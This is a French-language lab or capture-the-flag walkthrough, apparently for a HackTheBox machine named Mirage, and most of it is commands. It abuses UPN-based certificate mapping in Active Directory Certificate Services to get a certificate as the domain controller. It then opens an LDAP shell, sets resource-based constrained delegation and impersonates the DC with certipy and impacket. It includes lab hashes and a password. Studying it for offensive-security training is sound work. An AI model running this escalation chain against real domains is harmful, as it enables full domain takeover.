> [!TIP]
> Besoin d'un accès direct sur le serveur à impersonner afin de vérifier la valeur de la clé de registre CertificateMappingMethods dans HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\.
> Si configuré pour autoriser l'UPN based mapping (0x4) alors exploitable avec un template de certificat enrollable par un user dont on peut modifier l'UPN !


Update l'UPN du user contrôlé avec celui du DC (mettre le FQDN)

```
certipy-ad account -u 'Mirage-Service$' -hashes :24cbbd8d239d53284f030ee9b4ff3684 -k -dc-ip '10.10.11.78'  -upn 'DC01$@mirage.htb' -user '<controlled_user>' update -target "dc01.mirage.htb"
```

Récupérer un TGT pour le user contrôlé et injecter le ticket.

```
impacket-getTGT mirage.htb/mark.bbond:'1day@atime' -dc-ip dc01.mirage.htb
export KRB5CCNAME=mark.bbond.ccache
```

Demander un certificat en utilisant le template User (Le certificat sera alors au nom du DC grâce à l'UPN).

```
certipy-ad req -k -dc-ip '10.10.11.78' -target 'DC01.MIRAGE.HTB' -ca 'mirage-DC01-CA' -template 'User'
```

Remettre l'UPN original sur le user contrôlé afin de ne pas faire de collision d'UPN.

```
export KRB5CCNAME=Mirage-Service\$.ccache
certipy-ad account -u 'Mirage-Service$' -hashes :24cbbd8d239d53284f030ee9b4ff3684 -k -dc-ip '10.10.11.78'  -upn 'mark.bbond@mirage.htb'  -user 'mark.bbond' update -target "dc01.mirage.htb"
```

Obtenir un shell ldap en tant que DC, en utilisant le certificat précédemment obtenu.

```
certipy-ad auth -dc-ip '10.10.11.78' \                                         -pfx dc01.pfx -ldap-shell
```

Créer une délégation contrainte basé sur les ressources (RBCD) afin d'autoriser un compte de machine à demander un Ticket de Service en tant que DC.

> [!WARNING]
> Le compte doit obligatoirement etre un compte de machine pour que cela fonctionne.

```
set_rbcd DC01$ MACHINE_ACCOUNT$
exit
```

Demander un Ticket de service pour se faire passer pour le DC.

```
impacket-getST -spn cifs/DC01.MIRAGE.HTB -impersonate "dc01$" -dc-ip 10.10.11.78 "mirage.htb/MACHINE_ACCOUNT$":"PASSWORD" 
```




